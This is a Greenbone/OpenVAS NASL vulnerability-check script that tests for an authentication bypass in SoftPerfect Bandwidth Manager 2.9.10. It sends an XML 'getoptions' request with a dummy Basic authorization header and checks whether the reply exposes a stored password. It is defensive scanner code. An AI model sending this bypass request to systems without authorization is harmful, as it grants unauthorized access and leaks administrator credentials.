# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103500");
  script_version("2023-07-25T05:05:58+0000");

  script_name("SoftPerfect Bandwidth Manager Authentication Bypass Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54182");

  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-06-26 11:12:35 +0200 (Tue, 26 Jun 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8701);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"SoftPerfect Bandwidth Manager is prone to an authentication-bypass
vulnerability.");
  script_tag(name:"impact", value:"An attacker can exploit this issue to bypass the authentication
process and gain unauthorized access to the affected system.");
  script_tag(name:"affected", value:"SoftPerfect Bandwidth Manager 2.9.10 is vulnerable. Other versions
may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:8701);

req = string("POST / HTTP/1.0\r\n",
             "Content-Type: text/xml\r\n",
             "Content-Length: 1\r\n\r\n");
result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("Authorization header required" >!< result)exit(0);

xml = '<?xml version="1.0" encoding="windows-1252"?>
<request>
    <command>getoptions</command>
</request>';

req = string("POST / HTTP/1.0\r\n",
             "Content-Type: text/xml\r\n",
             "Content-Length: ",strlen(xml),"\r\n",
             "Authorization: Basic AAAA\r\n",
             "\r\n",
             xml);
result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("<status>OK</status>" >< result) {
  if(result =~ "<password>[^<]+</password>") {
    security_message(port:port);
    exit(0);
  }
}

exit(0);
